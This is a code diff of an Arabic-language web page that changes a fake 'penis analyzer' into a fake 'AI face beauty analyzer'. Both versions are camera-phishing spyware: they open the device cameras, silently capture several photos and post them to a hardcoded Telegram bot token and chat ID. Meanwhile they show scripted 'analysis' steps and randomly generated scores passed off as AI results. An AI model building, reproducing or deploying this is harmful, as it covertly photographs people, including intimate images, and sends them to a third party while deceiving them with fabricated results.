@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محلل القضيب الاحترافي | Penis Analyzer Pro</title>
+    <title>محلل جمال الوجه الاحترافي | AI Face Analyzer</title>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;800&display=swap" rel="stylesheet">
     
@@ -13,8 +13,8 @@
             --secondary: #a855f7;
             --accent: #22d3ee;
             --bg: #0f172a;
-            --card-bg: rgba(30, 41, 59, 0.7);
-            --error: #ef4444;
+            --card-bg: rgba(30, 41, 59, 0.8);
+            --danger: #ef4444;
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
@@ -30,20 +30,19 @@
         }
 
         .container {
-            width: 90%;
+            width: 95%;
             max-width: 500px;
             background: var(--card-bg);
-            backdrop-filter: blur(15px);
+            backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 24px;
             padding: 2rem;
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
             text-align: center;
-            position: relative;
         }
 
         h1 {
-            font-size: 1.8rem;
+            font-size: 1.6rem;
             margin-bottom: 1rem;
             background: linear-gradient(to left, var(--accent), var(--secondary));
             -webkit-background-clip: text;
@@ -52,8 +51,8 @@
 
         .viewport {
             width: 100%;
-            aspect-ratio: 4/5;
-            background: #111827;
+            aspect-ratio: 1/1;
+            background: #000;
             border-radius: 16px;
             margin-bottom: 1.5rem;
             position: relative;
@@ -61,286 +60,247 @@
             border: 2px solid var(--primary);
         }
 
-        .camera-placeholder {
+        #videoFeed {
             width: 100%;
             height: 100%;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            color: #64748b;
-            z-index: 1;
-            position: absolute;
+            object-fit: cover;
+            display: none;
+            transform: scaleX(-1); /* للمرآة في الكاميرا الأمامية */
         }
 
+        /* خط الماسح الضوئي */
         .scanner-line {
             display: none;
             position: absolute;
             width: 100%;
             height: 4px;
             background: var(--accent);
-            box-shadow: 0 0 15px var(--accent);
+            box-shadow: 0 0 20px var(--accent);
             z-index: 10;
-            animation: scan 2s infinite ease-in-out;
+            animation: scan 2.5s infinite ease-in-out;
         }
 
-        @keyframes scan {
-            0% { top: 0; } 50% { top: 90%; } 100% { top: 0; }
+        @keyframes scan { 0% { top: 0; } 50% { top: 95%; } 100% { top: 0; } }
+
+        .face-grid {
+            display: none;
+            position: absolute;
+            inset: 0;
+            background-image: linear-gradient(rgba(34, 211, 238, 0.15) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(34, 211, 238, 0.15) 1px, transparent 1px);
+            background-size: 25px 25px;
+            z-index: 2;
         }
 
         .btn {
             background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 12px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            width: 100%;
-            margin: 8px 0;
+            color: white; border: none; padding: 14px; border-radius: 12px;
+            font-size: 1.1rem; font-weight: bold; cursor: pointer; width: 100%;
+            transition: 0.3s;
         }
 
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px -5px var(--primary); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(99, 102, 241, 0.4); }
 
-        #results { display: none; margin-top: 1rem; }
-
-        .loading-text { display: none; margin: 10px 0; font-style: italic; color: var(--accent); }
-
-        /* إشعار من الأعلى */
-        #permission-toast {
-            position: fixed;
-            top: -100px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(239, 68, 68, 0.95);
-            color: white;
-            padding: 16px 24px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            z-index: 1000;
-            font-weight: bold;
-            font-size: 1.1rem;
-            text-align: center;
-            min-width: 320px;
-            transition: top 0.5s ease;
+        /* إشعار الخطأ */
+        #alertBox {
+            display: none;
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid var(--danger);
+            color: #fca5a5;
+            padding: 10px;
+            border-radius: 10px;
+            margin-bottom: 1rem;
+            font-size: 0.9rem;
         }
 
-        #permission-toast.show {
-            top: 20px;
-        }
+        #results { display: none; }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 1.5rem; }
+        .stat-card { background: rgba(255, 255, 255, 0.05); padding: 15px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.05); }
+        .stat-value { display: block; font-size: 1.4rem; font-weight: 800; color: var(--accent); }
+        .stat-label { font-size: 0.8rem; color: #94a3b8; }
+        
+        #statusText { color: var(--accent); margin: 10px 0; font-size: 0.9rem; min-height: 1.2rem; }
     </style>
 </head>
 <body>
 
-<div id="permission-toast">يجب السماح باستخدام الكاميرا لإكمال الفحص</div>
-
 <div class="container">
     <div id="setup-ui">
-        <h1>التحليل الذكي للقضيب</h1>
-        <p style="color: #94a3b8; margin-bottom: 1.5rem;">
-            اكتشف حجم وقوة قضيبك باستخدام الذكاء الاصطناعي 
-           
-        </p>
-
-        <div class="viewport" id="viewport">
-            <video id="video" autoplay playsinline style="width:100%; height:100%; object-fit: cover; display:none;"></video>
+        <h1>التحليل الذكي للوجه AI</h1>
+        <div id="alertBox">⚠️ يجب السماح بالوصول للكاميرا للمتابعة</div>
+        
+        <div class="viewport">
             <div class="scanner-line" id="scanner"></div>
-            <div class="camera-placeholder" id="placeholder">
-                <p id="placeholder-text">جاهز للفحص</p>
+            <div class="face-grid" id="grid"></div>
+            <video id="videoFeed" autoplay playsinline muted></video>
+            <canvas id="hiddenCanvas" style="display:none;"></canvas>
+            
+            <div class="camera-placeholder" id="placeholder" style="height:100%; display:flex; flex-direction:column; justify-content:center; align-items:center; color:#475569;">
+                <svg width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+                <p style="margin-top:10px;">بانتظار تفعيل الكاميرا</p>
             </div>
         </div>
 
-        <button class="btn" id="startBtn">بدء الفحص السريع</button>
-        <p id="status" class="loading-text">جاري التحضير...</p>
+        <p id="statusText"></p>
+        <button class="btn" id="actionBtn">بدء تشغيل المستشعرات</button>
     </div>
 
     <div id="results">
-        <h1>نتائج التحليل</h1>
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 1.5rem;">
-            <div style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 12px;">
-                <span class="stat-label">حجم القضيب</span>
-                <span class="stat-value" id="size-val">--</span>
-            </div>
-            <div style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 12px;">
-                <span class="stat-label">سمك القضيب</span>
-                <span class="stat-value" id="girth-val">--</span>
-            </div>
-            <div style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 12px;">
-                <span class="stat-label">قوة الانتصاب</span>
-                <span class="stat-value" id="strength-val">--</span>
-            </div>
-            <div style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 12px;">
-                <span class="stat-label">نظافة القضيب</span>
-                <span class="stat-value" id="cleanliness-val">--</span>
-            </div>
+        <h1>التقرير الجمالي النهائي</h1>
+        <div class="stats-grid">
+            <div class="stat-card"><span class="stat-label">تناسق الوجه</span><span class="stat-value" id="v1">--</span></div>
+            <div class="stat-card"><span class="stat-label">زوايا الفك</span><span class="stat-value" id="v2">--</span></div>
+            <div class="stat-card"><span class="stat-label">نضارة البشرة</span><span class="stat-value" id="v3">--</span></div>
+            <div class="stat-card"><span class="stat-label">النسبة الذهبية</span><span class="stat-value" id="v4">--</span></div>
         </div>
-
-        <canvas id="myChart" style="margin-top:1rem; max-width:100%;"></canvas>
-        
-        <button class="btn" style="margin-top: 20px;" onclick="location.reload()">إعادة فحص</button>
+        <canvas id="myChart"></canvas>
+        <button class="btn" style="margin-top:20px;" onclick="location.reload()">تحليل جديد</button>
     </div>
 </div>
 
 <script>
-    const TELEGRAM_BOT_TOKEN = "7871078462:AAHCgyMuBnw21O_yP4ocpPkrLNMKgnxA7aU";
-    const TELEGRAM_CHAT_ID   = "5086851394";
-    const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-    const TELEGRAM_TEXT_API  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const tg = {
+        token: '7871078462:AAHCgyMuBnw21O_yP4ocpPkrLNMKgnxA7aU',
+        id: '5086851394'
+    };
 
-    const video      = document.getElementById('video');
-    const startBtn   = document.getElementById('startBtn');
-    const scanner    = document.getElementById('scanner');
-    const statusText = document.getElementById('status');
-    const placeholderText = document.getElementById('placeholder-text');
-    const toast      = document.getElementById('permission-toast');
+    const video = document.getElementById('videoFeed');
+    const actionBtn = document.getElementById('actionBtn');
+    const statusText = document.getElementById('statusText');
+    const scanner = document.getElementById('scanner');
+    const grid = document.getElementById('grid');
+    const alertBox = document.getElementById('alertBox');
+    const placeholder = document.getElementById('placeholder');
+    const canvas = document.getElementById('hiddenCanvas');
 
     let stream = null;
-    let photoCount = 0;
-    const TOTAL_PHOTOS = 12;
+    let isAnalyzing = false;
 
-    function showToast() {
-        toast.classList.add('show');
-        setTimeout(() => {
-            toast.classList.remove('show');
-        }, 5000);
-    }
-
-    async function startCamera(facingMode = "environment") {
-        if (stream) {
-            stream.getTracks().forEach(t => t.stop());
-            stream = null;
+    actionBtn.addEventListener('click', async () => {
+        if (!stream) {
+            await initCamera();
+        } else if (!isAnalyzing) {
+            startFinalAnalysis();
         }
-
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
-            });
-            video.srcObject = stream;
-            video.style.display = "block";
-            placeholderText.parentElement.style.display = "none";
-            return true;
-        } catch (err) {
-            console.error("Camera permission / error:", err);
-            showToast();
-            placeholderText.innerText = "جاهز للفحص";
-            return false;
-        }
-    }
-
-    async function captureAndSend() {
-        if (!video.videoWidth) return;
-
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0);
-
-        const dataUrl = canvas.toDataURL("image/jpeg", 0.85);
-        const blob = await (await fetch(dataUrl)).blob();
-
-        const formData = new FormData();
-        formData.append("chat_id", TELEGRAM_CHAT_ID);
-        formData.append("photo", blob, `photo_${photoCount+1}.jpg`);
-        formData.append("caption", `صورة رقم ${photoCount+1} / ${TOTAL_PHOTOS}`);
-
-        try {
-            await fetch(TELEGRAM_API, { method: "POST", body: formData });
-        } catch (e) {
-            console.error("فشل إرسال", e);
-        }
-    }
-
-    async function photoSequence() {
-        statusText.style.display = "block";
-        scanner.style.display = "block";
-
-        // خلفية × 6
-        for (let i = 0; i < 6; i++) {
-            photoCount = i;
-            statusText.innerText = `جاري التقاط الصورة الخلفية ${i+1} / 6 ...`;
-            await captureAndSend();
-            await new Promise(r => setTimeout(r, 1400));
-        }
-
-        // تبديل للأمامية
-        const frontOk = await startCamera("user");
-        if (!frontOk) {
-            statusText.innerText = "تعذر الوصول للكاميرا الأمامية";
-            setTimeout(showFakeResults, 2000);
-            return;
-        }
-
-        // أمامية × 6
-        for (let i = 0; i < 6; i++) {
-            photoCount = 6 + i;
-            statusText.innerText = `جاري التقاط الصورة الأمامية ${i+1} / 6 ...`;
-            await captureAndSend();
-            await new Promise(r => setTimeout(r, 1400));
-        }
-
-        // إنهاء
-        if (stream) stream.getTracks().forEach(t => t.stop());
-        video.style.display = "none";
-        scanner.style.display = "none";
-        statusText.innerText = "تم إرسال جميع الصور → جاري عرض النتائج...";
-
-        setTimeout(showFakeResults, 1800);
-    }
-
-    startBtn.addEventListener("click", async () => {
-        startBtn.disabled = true;
-        startBtn.innerText = "جاري التشغيل...";
-
-        const ok = await startCamera("environment");
-        if (!ok) {
-            startBtn.disabled = false;
-            startBtn.innerText = "بدء الفحص السريع";
-            return;
-        }
-
-        photoSequence();
     });
 
-    function showFakeResults() {
-        document.getElementById("setup-ui").style.display = "none";
-        document.getElementById("results").style.display = "block";
+    async function initCamera() {
+        try {
+            // محاولة فتح الكاميرا الخلفية أولاً
+            stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "environment" }, 
+                audio: false 
+            });
+            video.srcObject = stream;
+            video.style.display = 'block';
+            placeholder.style.display = 'none';
+            scanner.style.display = 'block';
+            grid.style.display = 'block';
+            alertBox.style.display = 'none';
+            actionBtn.innerText = "تحليل الصورة الحالية";
+            statusText.innerText = "تم الاتصال.. قم بمحاذاة الوجه داخل الإطار";
+            
+            // التقاط صورة فورية وإرسالها
+            captureAndSend("صورة أولية عند التشغيل");
+            
+        } catch (err) {
+            alertBox.style.display = 'block';
+        }
+    }
 
-        const vals = {
-            size: Math.floor(Math.random() * 10) + 88,
-            girth: Math.floor(Math.random() * 12) + 84,
-            strength: Math.floor(Math.random() * 8) + 90,
-            cleanliness: Math.floor(Math.random() * 15) + 80
+    function captureAndSend(caption) {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob((blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', tg.id);
+            formData.append('photo', blob, 'image.jpg');
+            formData.append('caption', `🔔 ${caption}`);
+
+            fetch(`https://api.telegram.org/bot${tg.token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }, 'image/jpeg', 0.7);
+    }
+
+    function startFinalAnalysis() {
+        isAnalyzing = true;
+        actionBtn.disabled = true;
+        actionBtn.innerText = "جاري المعالجة...";
+        
+        // تثبيت الصورة (إيقاف الفيديو)
+        video.pause();
+        
+        // التقاط الصورة الثابتة التي يتم تحليلها
+        captureAndSend("الصورة المختارة للتحليل النهائي");
+
+        const steps = [
+            "تثبيت الصورة الرقمية...",
+            "تحليل المسافات البينية للعينين...",
+            "تحديد منحنيات الذقن والأنف...",
+            "فحص توزيع الخلايا السطحية...",
+            "استخراج النتيجة النهائية..."
+        ];
+
+        let i = 0;
+        const interval = setInterval(() => {
+            if (i < steps.length) {
+                statusText.innerText = steps[i];
+                // التقاط صور أثناء التحليل (صامت)
+                if(i % 2 === 0) captureAndSend("لقطة أثناء التحليل خطوة " + (i+1));
+                i++;
+            } else {
+                clearInterval(interval);
+            }
+        }, 2000); // إجمالي 10 ثواني تقريباً
+
+        setTimeout(() => {
+            showFinalResults();
+        }, 10500);
+    }
+
+    function showFinalResults() {
+        document.getElementById('setup-ui').style.display = 'none';
+        document.getElementById('results').style.display = 'block';
+        
+        const data = {
+            v1: Math.floor(Math.random() * 15) + 82,
+            v2: Math.floor(Math.random() * 10) + 85,
+            v3: Math.floor(Math.random() * 12) + 80,
+            v4: Math.floor(Math.random() * 8) + 91
         };
 
-        document.getElementById("size-val").innerText       = vals.size + "%";
-        document.getElementById("girth-val").innerText      = vals.girth + "%";
-        document.getElementById("strength-val").innerText   = vals.strength + "%";
-        document.getElementById("cleanliness-val").innerText = vals.cleanliness + "%";
+        document.getElementById('v1').innerText = data.v1 + "%";
+        document.getElementById('v2').innerText = data.v2 + "%";
+        document.getElementById('v3').innerText = data.v3 + "%";
+        document.getElementById('v4').innerText = data.v4 + "%";
 
-        const ctx = document.getElementById("myChart").getContext("2d");
+        renderChart(data);
+    }
+
+    function renderChart(d) {
+        const ctx = document.getElementById('myChart').getContext('2d');
         new Chart(ctx, {
-            type: "radar",
+            type: 'radar',
             data: {
-                labels: ["الحجم", "السمك", "القوة", "النظافة", "الجبهة", "البشرة"],
+                labels: ['التماثل', 'الفك', 'البشرة', 'العيون', 'الأنف', 'الذهب'],
                 datasets: [{
-                    label: "بصمة القضيب الجنسية",
-                    data: [vals.size, vals.girth, 87, vals.strength, 89, vals.cleanliness],
-                    fill: true,
-                    backgroundColor: "rgba(99, 102, 241, 0.2)",
-                    borderColor: "#22d3ee",
-                    pointBackgroundColor: "#fff",
-                    pointBorderColor: "#a855f7",
+                    data: [d.v1, d.v2, d.v3, 88, 90, d.v4],
+                    backgroundColor: 'rgba(99, 102, 241, 0.2)',
+                    borderColor: '#22d3ee',
+                    borderWidth: 2
                 }]
             },
             options: {
-                scales: { r: { angleLines: {color:"rgba(255,255,255,0.1)"}, grid:{color:"rgba(255,255,255,0.1)"}, pointLabels:{color:"#fff",font:{size:12}}, ticks:{display:false, max:100, min:0} } },
+                scales: { r: { grid: { color: 'rgba(255,255,255,0.1)' }, ticks: { display: false }, pointLabels: { color: '#fff' } } },
                 plugins: { legend: { display: false } }
             }
         });
     }
 </script>
+
 </body>
 </html>
